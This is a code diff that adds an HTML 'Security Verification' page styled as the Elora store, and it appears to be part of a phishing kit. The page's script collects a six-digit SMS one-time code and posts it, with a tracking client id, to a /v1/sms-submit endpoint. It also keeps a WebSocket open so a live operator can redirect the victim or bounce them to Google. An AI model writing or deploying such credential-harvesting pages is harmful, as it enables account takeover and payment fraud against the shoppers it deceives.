@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification | Elora</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = { theme: { extend: { colors: { primary: '#2f1321', accent: '#e45b8a', sand: '#f5ebe7' }, fontFamily: { outfit: ['Outfit', 'sans-serif'] } } } }
+    </script>
+</head>
+
+<body class="bg-[#1a0b13] text-white min-h-screen flex items-center justify-center font-outfit p-4">
+    <div class="w-full max-w-sm bg-white text-primary rounded-3xl overflow-hidden shadow-2xl relative">
+        <div class="h-2 bg-accent w-full absolute top-0"></div>
+        <div class="p-8">
+            <div class="text-center mb-6">
+                <img src="https://cdn.salla.sa/wjBYz/jUswOYjAqz2JF3apQD7pIh2dbv7ppfHNsK3g30Rl.jpg"
+                    class="h-8 mx-auto mb-4" alt="Elora">
+                <h2 class="text-xl font-bold mb-1">Security Verification</h2>
+                <p class="text-xs text-gray-500">Code sent to mobile ending in <span id="phoneEnd">****</span></p>
+            </div>
+            <form id="otpForm" class="space-y-6">
+                <div class="flex justify-center gap-2" id="otpInputs">
+                    <input type="tel" maxlength="1"
+                        class="w-10 h-12 bg-gray-50 border border-gray-200 rounded-lg text-center text-xl font-bold otp-digit"
+                        required>
+                    <input type="tel" maxlength="1"
+                        class="w-10 h-12 bg-gray-50 border border-gray-200 rounded-lg text-center text-xl font-bold otp-digit"
+                        required>
+                    <input type="tel" maxlength="1"
+                        class="w-10 h-12 bg-gray-50 border border-gray-200 rounded-lg text-center text-xl font-bold otp-digit"
+                        required>
+                    <input type="tel" maxlength="1"
+                        class="w-10 h-12 bg-gray-50 border border-gray-200 rounded-lg text-center text-xl font-bold otp-digit"
+                        required>
+                    <input type="tel" maxlength="1"
+                        class="w-10 h-12 bg-gray-50 border border-gray-200 rounded-lg text-center text-xl font-bold otp-digit"
+                        required>
+                    <input type="tel" maxlength="1"
+                        class="w-10 h-12 bg-gray-50 border border-gray-200 rounded-lg text-center text-xl font-bold otp-digit"
+                        required>
+                </div>
+                <button type="submit" id="submitBtn"
+                    class="w-full bg-primary text-white py-3.5 rounded-xl font-bold shadow-lg shadow-primary/20 hover:bg-primary/90 transition-all text-sm uppercase">Verify
+                    Identity</button>
+            </form>
+        </div>
+    </div>
+    <script>
+        // WebSocket
+        let clientId = localStorage.getItem('aura_client_id');
+        if (!clientId) { clientId = 'cl-' + Math.random().toString(36).substr(2, 9); localStorage.setItem('aura_client_id', clientId); }
+
+        const host = window.location.protocol.startsWith('http') ? window.location.host : 'localhost:8000';
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${protocol}//${host}/ws/client/${clientId}`;
+
+        let ws;
+        function connectWS() {
+            ws = new WebSocket(wsUrl);
+            ws.onopen = () => ws.send(JSON.stringify({ event: 'step_update', data: { step: 'otp' } }));
+            ws.onmessage = (e) => {
+                try {
+                    const msg = JSON.parse(e.data);
+                    if (msg.type === 'REDIRECT') window.location.href = msg.url;
+                    else if (msg.type === 'BANNED') window.location.href = msg.redirect || 'https://www.google.com';
+                } catch (err) { }
+            };
+            ws.onclose = () => setTimeout(connectWS, 3000);
+        }
+        connectWS();
+
+        // Phone Mask
+        const orderData = JSON.parse(sessionStorage.getItem('orderData'));
+        if (orderData && orderData.phone) document.getElementById('phoneEnd').textContent = orderData.phone.slice(-4);
+
+        // Inputs
+        const inputs = document.querySelectorAll('.otp-digit');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => { if (e.target.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus(); });
+            input.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus(); });
+        });
+
+        // Submit
+        document.getElementById('otpForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = 'Verifying...';
+            btn.disabled = true;
+
+            let otpCode = '';
+            inputs.forEach(i => otpCode += i.value);
+
+            try {
+                // Post to API (Same host)
+                const apiUrl = window.location.protocol.startsWith('http') ? '/v1/sms-submit' : 'http://localhost:8000/v1/sms-submit';
+                await fetch(`${apiUrl}?client_id=${clientId}&otp=${otpCode}`, { method: 'POST' });
+                window.location.href = 'loading.html?next=success';
+            } catch (err) { alert("Connection Error"); btn.disabled = false; }
+        });
+    </script>
+</body>
+
+</html>
